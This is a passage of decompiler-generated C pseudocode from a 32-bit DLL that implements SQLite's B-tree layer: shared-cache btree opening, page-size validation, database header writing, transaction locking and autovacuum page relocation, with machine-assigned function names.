  int *v5; // [esp+8h] [ebp-4h] BYREF

  if ( !a2 )
    return 11;
  result = sub_1006EB74(*a1, a2, &v5, a4);
  if ( !result )
  {
    *a3 = sub_10062040(a2, v5, (int)a1);
    return 0;
  }
  return result;
}

//----- (100620A9) --------------------------------------------------------
int __usercall sub_100620A9@<eax>(int *a1@<eax>)
{
  int v2; // [esp+8h] [ebp-4h] BYREF

  v2 = -1;
  sub_1006DFE2(&v2, *a1);
  return v2;
}

//----- (100620C4) --------------------------------------------------------
int __usercall sub_100620C4@<eax>(int *a1@<eax>, int *a2@<ebx>, unsigned int a3)
{
  int v3; // esi

  v3 = sub_10062069(a1, a3, a2, 0);
  if ( !v3 )
  {
    v3 = sub_10061E53(*a2);
    if ( v3 )
      sub_100620FB(*a2);
  }
  return v3;
}

//----- (100620FB) --------------------------------------------------------
void __usercall sub_100620FB(int a1@<eax>)
{
  if ( a1 )
    sub_1006EC75(*(_DWORD *)(a1 + 68));
}

//----- (10062108) --------------------------------------------------------
int __cdecl sub_10062108(int a1)
{
  int result; // eax
  _BYTE *v2; // edi

  result = a1;
  v2 = *(_BYTE **)(a1 + 4);
  if ( *v2 )
  {
    *v2 = 0;
    if ( *(__int16 *)(a1 + 22) > 1 )
      return sub_10061E53((int)v2);
  }
  return result;
}

//----- (10062129) --------------------------------------------------------
int __cdecl sub_10062129(int a1)
{
  _DWORD *v1; // esi
  int result; // eax

  v1 = (_DWORD *)(*(_DWORD *)(a1 + 4) + 400);
  if ( *(_DWORD *)(a1 + 4) == -400 || !*v1 || *(int *)(*(_DWORD *)(a1 + 4) + 408) < 0 )
    return 0;
  result = ((int (__cdecl *)(_DWORD, _DWORD))*v1)(
             *(_DWORD *)(*(_DWORD *)(a1 + 4) + 404),
             *(_DWORD *)(*(_DWORD *)(a1 + 4) + 408));
  if ( result )
    ++v1[2];
  else
    v1[2] = -1;
  return result;
}

//----- (10062164) --------------------------------------------------------
int __cdecl sub_10062164(char *Str1, int a2, int *a3, int a4, int a5)
{
  int v5; // ebx
  int v6; // esi
  _BYTE *v7; // eax
  int v8; // edi
  bool v10; // zf
  int v11; // esi
  const char *v12; // ebx
  int v13; // esi
  int v14; // eax
  _DWORD *v15; // esi
  int v16; // eax
  int v17; // ecx
  void *v18; // esi
  int v19; // eax
  unsigned __int16 v20; // ax
  int v21; // eax
  int v22; // esi
  int *v23; // ecx
  int v24; // eax
  unsigned int v25; // ecx
  int v26; // ecx
  int v27; // [esp-4h] [ebp-90h]
  char v28[52]; // [esp+Ch] [ebp-80h] BYREF
  char v29[12]; // [esp+40h] [ebp-4Ch] BYREF
  char v30[44]; // [esp+4Ch] [ebp-40h] BYREF
  int v31; // [esp+78h] [ebp-14h]
  int v32; // [esp+7Ch] [ebp-10h]
  int v33; // [esp+80h] [ebp-Ch]
  int v34; // [esp+84h] [ebp-8h]
  int v35; // [esp+88h] [ebp-4h]
  char *Str1a; // [esp+94h] [ebp+8h]
  unsigned __int8 Str1_3; // [esp+97h] [ebp+Bh]

  v34 = 0;
  v35 = 0;
  if ( !Str1 || (v32 = 1, strcmp(Str1, Str2)) )
    v32 = 0;
  v5 = a2;
  v6 = *(_DWORD *)a2;
  v33 = *(_DWORD *)a2;
  v7 = sub_10059025(0x2Cu);
  v8 = (int)v7;
  if ( !v7 )
    return 7;
  v10 = v32 == 0;
  v7[8] = 0;
  *(_DWORD *)v7 = a2;
  *((_DWORD *)v7 + 7) = v7;
  *((_DWORD *)v7 + 8) = 1;
  if ( v10 && Str1 && *Str1 && (a5 & 0x20000) != 0 )
  {
    v11 = *(_DWORD *)(v6 + 8) + 1;
    v12 = (const char *)sub_10058C4C(v11);
    *(_BYTE *)(v8 + 9) = 1;
    if ( !v12 )
    {
      v27 = 7;
LABEL_12:
      v13 = v27;
      sub_10058E74(v8);
      return v13;
    }
    v14 = v33;
    *v12 = 0;
    (*(void (__cdecl **)(int, char *, int, const char *))(v14 + 36))(v14, Str1, v11, v12);
    v34 = sub_100612DC();
    sub_10061305(v34);
    v31 = sub_100612DC();
    sub_10061305(v31);
    v15 = (_DWORD *)dword_10186428;
    if ( dword_10186428 )
    {
      while ( strcmp(v12, *(const char **)(*v15 + 132)) || *(_DWORD *)*v15 != v33 )
      {
        v15 = (_DWORD *)v15[15];
        if ( !v15 )
          goto LABEL_24;
      }
      v16 = *(_DWORD *)(a2 + 4) - 1;
      if ( v16 >= 0 )
      {
        v17 = 16 * v16 + *(_DWORD *)(a2 + 8) + 4;
        while ( !*(_DWORD *)v17 || *(_DWORD **)(*(_DWORD *)v17 + 4) != v15 )
        {
          --v16;
          v17 -= 16;
          if ( v16 < 0 )
            goto LABEL_23;
        }
        sub_10061317(v31);
        sub_10061317(v34);
        sub_10058E74((int)v12);
        v27 = 19;
        goto LABEL_12;
      }
LABEL_23:
      *(_DWORD *)(v8 + 4) = v15;
      ++v15[14];
    }
LABEL_24:
    sub_10061317(v31);
    sub_10058E74((int)v12);
    if ( v15 )
    {
LABEL_52:
      if ( *(_BYTE *)(v8 + 9) )
      {
        v22 = 0;
        if ( *(int *)(a2 + 4) > 0 )
        {
          v23 = (int *)(*(_DWORD *)(a2 + 8) + 4);
          while ( 1 )
          {
            v24 = *v23;
            if ( *v23 )
            {
              if ( *(_BYTE *)(v24 + 9) )
                break;
            }
            ++v22;
            v23 += 4;
            if ( v22 >= *(_DWORD *)(a2 + 4) )
              goto LABEL_69;
          }
          while ( *(_DWORD *)(v24 + 24) )
            v24 = *(_DWORD *)(v24 + 24);
          v25 = *(_DWORD *)(v8 + 4);
          if ( v25 >= *(_DWORD *)(v24 + 4) )
          {
            while ( *(_DWORD *)(v24 + 20) && *(_DWORD *)(*(_DWORD *)(v24 + 20) + 4) < v25 )
              v24 = *(_DWORD *)(v24 + 20);
            v26 = *(_DWORD *)(v24 + 20);
            *(_DWORD *)(v8 + 20) = v26;
            *(_DWORD *)(v8 + 24) = v24;
            if ( v26 )
              *(_DWORD *)(v26 + 24) = v8;
            *(_DWORD *)(v24 + 20) = v8;
          }
          else
          {
            *(_DWORD *)(v8 + 20) = v24;
            *(_DWORD *)(v8 + 24) = 0;
            *(_DWORD *)(v24 + 24) = v8;
          }
        }
      }
      goto LABEL_69;
    }
    v5 = a2;
  }
  v18 = sub_10059025(0x50u);
  if ( !v18 )
  {
    v35 = 7;
    goto LABEL_28;
  }
  v35 = sub_1006E459(a4, v33, (int *)v18, Str1, a5);
  if ( v35 )
    goto LABEL_28;
  v35 = sub_1006DFA2(*(_DWORD *)v18, v28);
  if ( v35 )
    goto LABEL_28;
  v19 = *(_DWORD *)v18;
  *((_DWORD *)v18 + 1) = v5;
  *(_DWORD *)(v19 + 140) = sub_10062129;
  *(_DWORD *)(v19 + 144) = v18;
  *(_DWORD *)(v8 + 4) = v18;
  *((_DWORD *)v18 + 2) = 0;
  *((_DWORD *)v18 + 3) = 0;
  *((_BYTE *)v18 + 16) = *(_BYTE *)(*(_DWORD *)v18 + 12);
  LOBYTE(v19) = 0;
  BYTE1(v19) = v28[16];
  v20 = (unsigned __int8)v28[17] | (unsigned __int16)v19;
  *((_WORD *)v18 + 10) = v20;
  if ( v20 < 0x200u || v20 > 0x1000u || ((unsigned __int16)(v20 - 1) & v20) != 0 )
  {
    *((_WORD *)v18 + 10) = 0;
    if ( Str1 && !v32 )
    {
      *((_BYTE *)v18 + 18) = 0;
      *((_BYTE *)v18 + 19) = 0;
    }
    Str1_3 = 0;
  }
  else
  {
    Str1_3 = v28[20];
    *((_BYTE *)v18 + 17) = 1;
    *((_BYTE *)v18 + 18) = sub_10059C56(v29) != 0;
    *((_BYTE *)v18 + 19) = sub_10059C56(v30) != 0;
  }
  v35 = sub_1006DEE6(*(_DWORD *)v18, (unsigned __int16 *)v18 + 10, Str1_3);
  if ( v35 )
    goto LABEL_28;
  *((_WORD *)v18 + 11) = *((_WORD *)v18 + 10) - Str1_3;
  if ( *(_BYTE *)(v8 + 9) )
  {
    *((_DWORD *)v18 + 14) = 1;
    Str1a = (char *)sub_100612DC();
    if ( dword_1018214C )
    {
      v21 = sub_100612DC();
      *((_DWORD *)v18 + 12) = v21;
      if ( !v21 )
      {
        v35 = 7;
        *(_BYTE *)(a2 + 30) = 0;
LABEL_28:
        if ( v18 && *(_DWORD *)v18 )
          sub_1006E0B9(*(_DWORD *)v18);
        sub_10058E74((int)v18);
        sub_10058E74(v8);
        *a3 = 0;
        goto LABEL_32;
      }
    }
    sub_10061305((int)Str1a);
    *((_DWORD *)v18 + 15) = dword_10186428;
    dword_10186428 = (int)v18;
    sub_10061317((int)Str1a);
    goto LABEL_52;
  }
LABEL_69:
  *a3 = v8;
LABEL_32:
  if ( v34 )
    sub_10061317(v34);
  return v35;
}
// 1018214C: using guessed type int dword_1018214C;
// 10186428: using guessed type int dword_10186428;
// 10062164: using guessed type char var_4C[12];
// 10062164: using guessed type char var_40[44];

//----- (10062507) --------------------------------------------------------
int __usercall sub_10062507@<eax>(int *a1@<esi>)
{
  int v1; // edi
  int v2; // ebx
  int v3; // eax
  int *v4; // ecx

  v1 = 0;
  v2 = sub_100612DC();
  sub_10061305(v2);
  if ( --a1[14] <= 0 )
  {
    v3 = dword_10186428;
    if ( (int *)dword_10186428 == a1 )
    {
      dword_10186428 = a1[15];
    }
    else if ( dword_10186428 )
    {
      do
      {
        v4 = *(int **)(v3 + 60);
        if ( v4 == a1 )
          break;
        v3 = *(_DWORD *)(v3 + 60);
      }
      while ( v4 );
      if ( v3 )
        *(_DWORD *)(v3 + 60) = a1[15];
    }
    sub_100612F3(a1[12]);
    v1 = 1;
  }
  sub_10061317(v2);
  return v1;
}
// 10186428: using guessed type int dword_10186428;

//----- (1006256A) --------------------------------------------------------
int __usercall sub_1006256A@<eax>(int a1@<eax>)
{
  int v2; // esi
  _DWORD *v3; // ebx
  int v4; // eax
  bool v5; // zf
  void (__cdecl *v6)(_DWORD); // ecx
  int v7; // eax
  int v8; // eax

  v2 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  v3 = *(_DWORD **)(v2 + 8);
  while ( v3 )
  {
    v4 = (int)v3;
    v5 = *v3 == a1;
    v3 = (_DWORD *)v3[2];
    if ( v5 )
      sub_1006345E(v4);
  }
  sub_100632C4(a1);
  sub_10068CA7(a1);
  if ( !*(_BYTE *)(a1 + 9) || sub_10062507((int *)v2) )
  {
    sub_1006E0B9(*(_DWORD *)v2);
    v6 = *(void (__cdecl **)(_DWORD))(v2 + 44);
    if ( v6 && *(_DWORD *)(v2 + 40) )
      v6(*(_DWORD *)(v2 + 40));
    sub_10058E74(*(_DWORD *)(v2 + 40));
    sub_10066DE3(*(_DWORD **)(v2 + 76));
    *(_DWORD *)(v2 + 76) = 0;
    sub_10058E74(v2);
  }
  v7 = *(_DWORD *)(a1 + 24);
  if ( v7 )
    *(_DWORD *)(v7 + 20) = *(_DWORD *)(a1 + 20);
  v8 = *(_DWORD *)(a1 + 20);
  if ( v8 )
    *(_DWORD *)(v8 + 24) = *(_DWORD *)(a1 + 24);
  sub_10058E74(a1);
  return 0;
}

//----- (10062612) --------------------------------------------------------
int __usercall sub_10062612@<eax>(int a1@<eax>, int a2@<ebx>)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax

  v3 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  v4 = *(_DWORD *)(*(_DWORD *)v3 + 168);
  *(_DWORD *)(v4 + 16) = a2;
  v5 = *(_DWORD *)(v4 + 40);
  if ( v5 )
    dword_101821B4(v5, a2);
  sub_10068CA7(a1);
  return 0;
}
// 101821B4: using guessed type int (__cdecl *dword_101821B4)(_DWORD, _DWORD);

//----- (10062646) --------------------------------------------------------
int __usercall sub_10062646@<eax>(int a1@<eax>, int a2, int a3)
{
  _DWORD *v4; // esi
  _BYTE *v5; // eax
  char v6; // cl
  bool v7; // dl

  v4 = *(_DWORD **)(a1 + 4);
  sub_10068C39(a1);
  v5 = (_BYTE *)*v4;
  v6 = 1;
  v7 = a2 == 1 || v5[11];
  v5[8] = v7;
  if ( a2 != 3 || v5[11] )
    v6 = 0;
  v5[9] = v6;
  v5[10] = (a3 != 0) + 2;
  if ( v7 )
    v5[16] = 0;
  sub_10068CA7(a1);
  return 0;
}

//----- (100626A1) --------------------------------------------------------
int __usercall sub_100626A1@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // esi
  int v6; // esi
  int v8; // eax

  v4 = *(_DWORD *)(a2 + 4);
  sub_10068C39(a2);
  if ( *(_BYTE *)(v4 + 17) )
  {
    v6 = 8;
  }
  else
  {
    if ( a3 < 0 )
      a3 = *(unsigned __int16 *)(v4 + 20) - *(unsigned __int16 *)(v4 + 22);
    if ( (unsigned int)(a1 - 512) <= 0xE00 && ((a1 - 1) & a1) == 0 )
    {
      *(_WORD *)(v4 + 20) = a1;
      sub_10066DE3(*(_DWORD **)(v4 + 76));
      *(_DWORD *)(v4 + 76) = 0;
    }
    v8 = sub_1006DEE6(*(_DWORD *)v4, (unsigned __int16 *)(v4 + 20), a3);
    *(_WORD *)(v4 + 22) = *(_WORD *)(v4 + 20) - a3;
    if ( a4 )
      *(_BYTE *)(v4 + 17) = 1;
    v6 = v8;
  }
  sub_10068CA7(a2);
  return v6;
}

//----- (10062735) --------------------------------------------------------
int __usercall sub_10062735@<eax>(int a1@<eax>, char a2)
{
  _BYTE *v3; // esi
  int v4; // ebx

  v3 = *(_BYTE **)(a1 + 4);
  v4 = 0;
  sub_10068C39(a1);
  if ( !v3[17] || (a2 != 0) == v3[18] )
  {
    v3[18] = a2 != 0;
    v3[19] = a2 == 2;
  }
  else
  {
    v4 = 8;
  }
  sub_10068CA7(a1);
  return v4;
}

//----- (10062784) --------------------------------------------------------
int __usercall sub_10062784@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // esi

  sub_10068C39(a1);
  v2 = *(_DWORD *)(a1 + 4);
  if ( *(_BYTE *)(v2 + 18) )
    v3 = (*(_BYTE *)(v2 + 19) != 0) + 1;
  else
    v3 = 0;
  sub_10068CA7(a1);
  return v3;
}

//----- (100627B1) --------------------------------------------------------
int __usercall sub_100627B1@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // esi
  unsigned __int16 v4; // ax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // esi
  int v9; // edi
  unsigned __int16 v10; // cx
  __int16 v11; // ax
  int v12; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+10h] [ebp-8h] BYREF
  int v15; // [esp+14h] [ebp-4h] BYREF

  result = sub_1006E907(*(_DWORD *)a1);
  if ( !result )
  {
    result = sub_10062069((int *)a1, 1u, &v15, 0);
    if ( !result )
    {
      v12 = sub_1006DFE2(&v14, *(_DWORD *)a1);
      if ( !v12 )
      {
        if ( v14 <= 0 )
        {
LABEL_16:
          v10 = *(_WORD *)(a1 + 22);
          v13 = v10 - 12;
          *(_WORD *)(a1 + 28) = v10 - 35;
          *(_WORD *)(a1 + 24) = (v13 << 6) / 255 - 23;
          v11 = 32 * v13 / 255 - 23;
          *(_WORD *)(a1 + 26) = v11;
          *(_WORD *)(a1 + 30) = v11;
          *(_DWORD *)(a1 + 12) = v15;
          return 0;
        }
        v3 = *(_DWORD *)(v15 + 64);
        v12 = 26;
        if ( !strcmp((const char *)v3, "SQLite format 3") )
        {
          if ( *(_BYTE *)(v3 + 18) > 1u )
            *(_BYTE *)(a1 + 16) = 1;
          if ( *(_BYTE *)(v3 + 19) <= 1u && !memcmp((const void *)(v3 + 21), asc_10181E30, 3u) )
          {
            HIBYTE(v4) = *(_BYTE *)(v3 + 16);
            LOBYTE(v4) = *(_BYTE *)(v3 + 17);
            v5 = v4;
            if ( ((v4 - 1) & v4) == 0 && (unsigned int)v4 - 512 <= 0xE00 )
            {
              v6 = v4 - *(unsigned __int8 *)(v3 + 20);
              v7 = *(unsigned __int16 *)(a1 + 20);
              v14 = v5 - *(unsigned __int8 *)(v3 + 20);
              if ( v5 != v7 )
              {
                sub_100620FB(v15);
                v8 = *(_DWORD **)(a1 + 76);
                *(_WORD *)(a1 + 22) = v14;
                *(_WORD *)(a1 + 20) = v5;
                sub_10066DE3(v8);
                v9 = v5 - v14;
                *(_DWORD *)(a1 + 76) = 0;
                return sub_1006DEE6(*(_DWORD *)a1, (unsigned __int16 *)(a1 + 20), v9);
              }
              if ( v6 >= 480 )
              {
                *(_WORD *)(a1 + 22) = v6;
                *(_WORD *)(a1 + 20) = v5;
                *(_BYTE *)(a1 + 18) = sub_10059C56((_BYTE *)(v3 + 52)) != 0;
                *(_BYTE *)(a1 + 19) = sub_10059C56((_BYTE *)(v3 + 64)) != 0;
                goto LABEL_16;
              }
            }
          }
        }
      }
      sub_100620FB(v15);
      *(_DWORD *)(a1 + 12) = 0;
      return v12;
    }
  }
  return result;
}

//----- (1006294A) --------------------------------------------------------
void __usercall sub_1006294A(int a1@<esi>)
{
  int v1; // eax

  if ( !*(_BYTE *)(a1 + 32) )
  {
    v1 = *(_DWORD *)(a1 + 12);
    if ( v1 )
    {
      sub_100620FB(v1);
      *(_DWORD *)(a1 + 12) = 0;
    }
  }
}

//----- (10062963) --------------------------------------------------------
int __usercall sub_10062963@<eax>(int a1@<ebx>)
{
  int result; // eax
  int v2; // esi
  char *v3; // edi
  int v4; // ecx
  int v5; // [esp+Ch] [ebp-4h] BYREF

  result = sub_1006DFE2(&v5, *(_DWORD *)a1);
  if ( !result && v5 <= 0 )
  {
    v2 = *(_DWORD *)(a1 + 12);
    v3 = *(char **)(v2 + 64);
    result = sub_1006EFC8(*(_DWORD *)(v2 + 68));
    if ( !result )
    {
      strcpy(v3, "SQLite format 3");
      v3[16] = *(_BYTE *)(a1 + 21);
      v3[17] = *(_BYTE *)(a1 + 20);
      v3[18] = 1;
      v3[19] = 1;
      v3[20] = *(_BYTE *)(a1 + 20) - *(_BYTE *)(a1 + 22);
      v3[21] = 64;
      v3[22] = 32;
      v3[23] = 32;
      memset(v3 + 24, 0, 0x4Cu);
      sub_10061FAA(v2, 13);
      v4 = *(unsigned __int8 *)(a1 + 18);
      *(_BYTE *)(a1 + 17) = 1;
      sub_10059C70(v3 + 52, v4);
      sub_10059C70(v3 + 64, *(unsigned __int8 *)(a1 + 19));
      return 0;
    }
  }
  return result;
}

//----- (10062A0B) --------------------------------------------------------
int __usercall sub_10062A0B@<eax>(int a1@<eax>, int a2)
{
  int v3; // esi
  int v4; // ebx
  char v5; // al
  _DWORD *v6; // eax
  int i; // eax
  unsigned __int8 v8; // al

  v3 = *(_DWORD *)(a1 + 4);
  v4 = 0;
  sub_10068C39(a1);
  v5 = *(_BYTE *)(a1 + 8);
  if ( v5 == 2 )
    goto LABEL_40;
  if ( v5 == 1 && !a2 )
    goto LABEL_42;
  if ( *(_BYTE *)(v3 + 16) )
  {
    if ( a2 )
    {
      v4 = 8;
      goto LABEL_42;
    }
  }
  else if ( a2 && *(_BYTE *)(v3 + 32) == 2 )
  {
    goto LABEL_10;
  }
  if ( !*(_BYTE *)(v3 + 73) )
  {
    if ( a2 > 1 )
    {
      for ( i = *(_DWORD *)(v3 + 64); i; i = *(_DWORD *)(i + 12) )
      {
        if ( *(_DWORD *)i != a1 )
        {
          v6 = *(_DWORD **)i;
          goto LABEL_24;
        }
      }
    }
    goto LABEL_16;
  }
LABEL_10:
  v6 = *(_DWORD **)(v3 + 68);
LABEL_24:
  if ( *v6 )
  {
    v4 = 262;
    goto LABEL_42;
  }
LABEL_16:
  v4 = sub_100613B6(1, a1, 1);
  if ( v4 )
    goto LABEL_42;
  do
  {
    do
    {
      if ( *(_DWORD *)(v3 + 12) )
        break;
      v4 = sub_100627B1(v3);
    }
    while ( !v4 );
    if ( !v4 )
    {
      if ( !a2 )
        goto LABEL_33;
      if ( *(_BYTE *)(v3 + 16) )
      {
        v4 = 8;
      }
      else
      {
        v4 = sub_1006ED9F(*(_DWORD *)v3, a2 > 1, *(_BYTE *)(*(_DWORD *)a1 + 29) == 2);
        if ( !v4 )
        {
          v4 = sub_10062963(v3);
          if ( !v4 )
            goto LABEL_29;
        }
      }
    }
    sub_1006294A(v3);
LABEL_29:
    if ( v4 != 5 )
      break;
    if ( *(_BYTE *)(v3 + 32) )
      goto LABEL_42;
  }
  while ( sub_10062129(v3) );
  if ( v4 )
    goto LABEL_42;
LABEL_33:
  if ( !*(_BYTE *)(a1 + 8) )
  {
    ++*(_DWORD *)(v3 + 36);
    if ( *(_BYTE *)(a1 + 9) )
    {
      *(_BYTE *)(a1 + 36) = 1;
      *(_DWORD *)(a1 + 40) = *(_DWORD *)(v3 + 64);
      *(_DWORD *)(v3 + 64) = a1 + 28;
    }
  }
  v8 = (a2 != 0) + 1;
  *(_BYTE *)(a1 + 8) = v8;
  if ( v8 > *(_BYTE *)(v3 + 32) )
    *(_BYTE *)(v3 + 32) = v8;
  if ( a2 )
  {
    *(_DWORD *)(v3 + 68) = a1;
    *(_BYTE *)(v3 + 72) = a2 > 1;
LABEL_40:
    if ( a2 )
      v4 = sub_1006F459(*(_DWORD *)v3, *(_DWORD *)(*(_DWORD *)a1 + 452));
  }
LABEL_42:
  sub_10068CA7(a1);
  return v4;
}

//----- (10062B85) --------------------------------------------------------
int __usercall sub_10062B85@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int v3; // ecx
  _BYTE *v4; // eax
  __int16 v5; // dx
  int v6; // eax
  int v7; // eax
  int v9; // [esp+10h] [ebp-18h]
  int *v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  _BYTE *v12; // [esp+1Ch] [ebp-Ch]
  int v13; // [esp+20h] [ebp-8h] BYREF
  char v14; // [esp+27h] [ebp-1h]

  v10 = *(int **)(a1 + 60);
  v14 = *(_BYTE *)a1;
  v11 = *(_DWORD *)(a1 + 72);
  v13 = sub_10061E53(a1);
  if ( !v13 )
  {
    v2 = 0;
    v9 = *(unsigned __int16 *)(a1 + 16);
    if ( *(_WORD *)(a1 + 16) )
    {
      do
      {
        v3 = *(_DWORD *)(a1 + 64);
        v4 = (_BYTE *)(v3 + *(unsigned __int16 *)(a1 + 12) + 2 * v2);
        HIBYTE(v5) = *v4;
        LOBYTE(v5) = v4[1];
        v12 = (_BYTE *)(v3 + (unsigned __int16)(*(_WORD *)(a1 + 18) & v5));
        sub_100619BB(&v13, a1, (int)v12);
        if ( !*(_BYTE *)(a1 + 3) )
        {
          v6 = sub_10059C56(v12);
          sub_100616A8(v6, v10, 5, v11, &v13);
        }
        ++v2;
      }
      while ( v2 < v9 );
    }
    if ( !*(_BYTE *)(a1 + 3) )
    {
      v7 = sub_10059C56((_BYTE *)(*(unsigned __int8 *)(a1 + 5) + *(_DWORD *)(a1 + 64) + 8));
      sub_100616A8(v7, v10, 5, v11, &v13);
    }
  }
  *(_BYTE *)a1 = v14;
  return v13;
}
// 10062B85: using guessed type int var_8;

//----- (10062C46) --------------------------------------------------------
int __usercall sub_10062C46@<eax>(int a1@<eax>, int a2, int a3, char a4)
{
  _BYTE *v5; // edi
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  _BYTE *v10; // eax
  __int16 v11; // dx
  _BYTE *v12; // edx
  _BYTE *v13; // esi
  _BYTE *v14; // eax
  _BYTE *v15; // esi
  char v16[28]; // [esp+10h] [ebp-34h] BYREF
  unsigned __int16 v17; // [esp+2Ch] [ebp-18h]
  int v18; // [esp+34h] [ebp-10h]
  int v19; // [esp+38h] [ebp-Ch]
  char v20; // [esp+3Fh] [ebp-5h]

  if ( a4 == 4 )
  {
    v5 = *(_BYTE **)(a1 + 64);
    if ( sub_10059C56(v5) != a2 )
      return 11;
    sub_10059C70(v5, a3);
    return 0;
  }
  v20 = *(_BYTE *)a1;
  sub_10061E53(a1);
  v7 = *(unsigned __int16 *)(a1 + 16);
  v8 = 0;
  v18 = v7;
  v19 = 0;
  if ( !v7 )
    goto LABEL_15;
  while ( 1 )
  {
    v9 = *(_DWORD *)(a1 + 64);
    v10 = (_BYTE *)(v9 + *(unsigned __int16 *)(a1 + 12) + 2 * v8);
    HIBYTE(v11) = *v10;
    LOBYTE(v11) = v10[1];
    v12 = (_BYTE *)(v9 + (unsigned __int16)(*(_WORD *)(a1 + 18) & v11));
    v13 = v12;
    if ( a4 != 3 )
      break;
    sub_100617C9((int)v16, (_BYTE *)a1, (int)v12);
    if ( v17 && a2 == sub_10059C56(&v13[v17]) )
    {
      v14 = &v13[v17];
      goto LABEL_14;
    }
LABEL_11:
    v8 = ++v19;
    if ( v19 >= v18 )
      goto LABEL_15;
  }
  if ( sub_10059C56(v12) != a2 )
    goto LABEL_11;
  v14 = v13;
LABEL_14:
  sub_10059C70(v14, a3);
LABEL_15:
  if ( v19 != v18 )
  {
LABEL_19:
    *(_BYTE *)a1 = v20;
    return 0;
  }
  if ( a4 == 5 )
  {
    v15 = (_BYTE *)(*(unsigned __int8 *)(a1 + 5) + *(_DWORD *)(a1 + 64) + 8);
    if ( sub_10059C56(v15) == a2 )
    {
      sub_10059C70(v15, a3);
      goto LABEL_19;
    }
  }
  return 11;
}
// 10062C46: using guessed type char var_34[28];

//----- (10062D4C) --------------------------------------------------------
int __usercall sub_10062D4C@<eax>(int a1@<eax>, int *a2@<ecx>, int a3@<ebx>, char a4, unsigned int a5, int a6)
{
  int result; // eax
  int v9; // eax
  int v10; // edi
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h] BYREF

  v11 = *(_DWORD *)(a1 + 72);
  result = sub_1006F5BD(*(_DWORD *)(a1 + 68), *a2, a3, a6);
  v12 = result;
  if ( !result )
  {
    *(_DWORD *)(a1 + 72) = a3;
    if ( a4 == 5 || a4 == 1 )
    {
      v12 = sub_10062B85(a1);
      if ( v12 )
        return v12;
    }
    else
    {
      v9 = sub_10059C56(*(_BYTE **)(a1 + 64));
      if ( v9 )
      {
        sub_100616A8(v9, a2, 4, a3, &v12);
        result = v12;
        if ( v12 )
          return result;
      }
    }
    if ( a4 != 1 )
    {
      result = sub_10062069(a2, a5, &v12, 0);
      if ( result )
        return result;
      v10 = v12;
      v12 = sub_1006EFC8(*(_DWORD *)(v12 + 68));
      if ( v12 )
      {
        sub_100620FB(v10);
      }
      else
      {
        v12 = sub_10062C46(v10, v11, a3, a4);
        sub_100620FB(v10);
        if ( !v12 )
          sub_100616A8(a3, a2, a4, a5, &v12);
      }
    }
    return v12;
  }
  return result;
}

//----- (10062E31) --------------------------------------------------------
int __usercall sub_10062E31@<eax>(int a1@<eax>, unsigned int a2, int a3)
{
  unsigned int v3; // ebx
  int result; // eax
  int v6; // esi
  int v7; // esi
  int v8; // ebx
  int v9; // esi
  int v11; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+10h] [ebp-10h] BYREF
  unsigned int v13; // [esp+14h] [ebp-Ch] BYREF
  int v14; // [esp+18h] [ebp-8h] BYREF
  int v15; // [esp+1Ch] [ebp-4h] BYREF

  v3 = a3;
  if ( sub_1006166F(a1, a3) == v3 || v3 == 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1 )
    goto LABEL_23;
  if ( !sub_10059C56((_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 64) + 36)) )
    return 101;
  result = sub_1006175A(v3, (int *)a1, &v15, &v11);
  if ( !result )
  {
    if ( (_BYTE)v15 == 1 )
      return 11;
    if ( (_BYTE)v15 == 2 )
    {
      if ( !a2 )
      {
        result = sub_10063F4D(a1, &a3, &v11, v3, 1);
        if ( result )
          return result;
        sub_100620FB(a3);
LABEL_24:
        while ( --v3 == 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1 || sub_1006166F(a1, v3) == v3 )
        {
          if ( sub_1006166F(a1, v3) == v3 )
          {
            result = sub_10062069((int *)a1, v3, &a3, 0);
            if ( result )
              return result;
            v9 = a3;
            v11 = sub_1006EFC8(*(_DWORD *)(a3 + 68));
            sub_100620FB(v9);
            result = v11;
            if ( v11 )
              return result;
          }
        }
        *(_DWORD *)(*(_DWORD *)a1 + 24) = v3;
      }
      return 0;
    }
    result = sub_10062069((int *)a1, v3, &v14, 0);
    if ( result )
      return result;
    do
    {
      v6 = sub_10063F4D(a1, &v12, (int *)&v13, 0, 0);
      if ( v6 )
      {
        sub_100620FB(v14);
        return v6;
      }
      sub_100620FB(v12);
    }
    while ( a2 && v13 > a2 );
    v7 = v14;
    v8 = sub_1006EFC8(*(_DWORD *)(v14 + 68));
    if ( !v8 )
      v8 = sub_10062D4C(v7, (int *)a1, v13, v15, v11, a2 != 0);
    sub_100620FB(v7);
    if ( v8 )
      return v8;
    v3 = a3;
LABEL_23:
    if ( !a2 )
      goto LABEL_24;
    return 0;
  }
  return result;
}

//----- (10062FDF) --------------------------------------------------------
int __usercall sub_10062FDF@<eax>(int a1@<eax>)
{
  int v2; // esi
  int v3; // esi
  int v4; // eax

  v2 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  if ( *(_BYTE *)(v2 + 18) )
  {
    v4 = sub_100620A9((int *)v2);
    v3 = sub_10062E31(v2, 0, v4);
  }
  else
  {
    v3 = 101;
  }
  sub_10068CA7(a1);
  return v3;
}

//----- (10063019) --------------------------------------------------------
int __usercall sub_10063019@<eax>(int a1@<eax>)
{
  unsigned int v2; // ebx
  unsigned int v3; // esi
  unsigned int v4; // esi
  int v5; // eax
  int v6; // ecx
  int v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+14h] [ebp-Ch]
  unsigned int v10; // [esp+18h] [ebp-8h]
  int v11; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  v8 = *(_DWORD *)a1;
  if ( *(_BYTE *)(a1 + 19) )
    return v11;
  v2 = sub_100620A9((int *)a1);
